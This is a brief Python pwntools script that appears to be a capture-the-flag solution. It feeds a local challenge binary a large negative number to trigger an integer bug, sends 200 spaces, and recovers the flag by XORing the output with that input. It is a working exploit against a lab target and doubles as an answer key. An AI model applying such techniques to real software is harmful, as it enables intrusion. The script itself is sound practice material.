#!/usr/bin/env python3

from pwn import *

io = process('./container/chall')

io.recvuntil(b'Choice: ')
io.sendline(f'{-(1<<31)+1}'.encode())
io.recvuntil(b'Input: ')
payload = ' '*200
io.sendline(payload.encode())
io.recvuntil(b'Result: ')
res = io.recvline()
flag = bytes(x^y for x,y in zip(payload.encode(), res)).rstrip(b'\0').decode().strip()
log.info('Flag: %s', flag)
